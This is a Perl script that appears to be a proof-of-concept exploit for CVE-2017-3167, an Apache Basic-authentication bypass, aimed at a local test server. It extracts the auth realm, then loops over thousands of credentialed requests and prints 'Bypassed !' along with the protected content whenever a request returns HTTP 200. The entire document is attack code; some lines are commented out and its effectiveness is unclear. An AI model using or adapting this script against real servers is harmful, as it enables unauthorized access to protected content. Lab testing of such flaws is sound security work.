#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Data::Dump qw(dump);
use MIME::Base64;

my $ua = LWP::UserAgent->new();
my $host = "localhost";
my $port = 13370;
my $url = "http://$host:$port/CVE-2017-3167/";
my $response = 0;
my $username = "test";
my $password = $ARGV[0] or $password = '';
my $realm = 0;
#if($ARGV[1]) { $url = $ARGV[1]; }
$response = $ua->get($url);
$realm = getRealmText($response);
sendAuth($ua, $url, $host, $port, $realm, $username, $password);

sub getRealmText {
    my ( $response ) = @_;
    my $realm_text = "Protected";
    my $header = 0;
    
    if($response->header("www-authenticate")) {
        $header = $response->header("www-authenticate");
        ($realm_text) = $header =~ /realm="(.*)"/i;
        print "Realm Extracted : $realm_text\n";
    } else {
        print "Unable To Extract Realm Value\nUsing: \"Protected\"\n\n";
    }
    
    return $realm_text;
}

sub sendAuth {
    my ($ua, $url, $host, $port, $realm, $username, $password) = @_;
    my $response = 0;
    
    for (my $i = 0; $i <= 5000; $i++) {
       my $passwd = encode_base64("$username:$password");
       chomp $passwd;
   
       my $request = new HTTP::Request "GET", $url;
       #$request->header("Authorization" => "Basic $passwd");
       $ua->credentials("$host:$port", $realm, $username, $password);
     
     #  $request->header('Content-Length' => length($passwd)%3);
       $request->header("connection" => "Keep-Alive");
       $response = $ua->request($request);
       print dump($response);
       print "\n\nResponse Code : " . $response->code . " [" . $response->message . "]\n";
       
       if($response->code eq "200") {
          print "Bypassed !\nCredentials : $username:$password\n\nResponse Content: " . $response->content . "\n\n";
	  
       }
    }
    
   
}
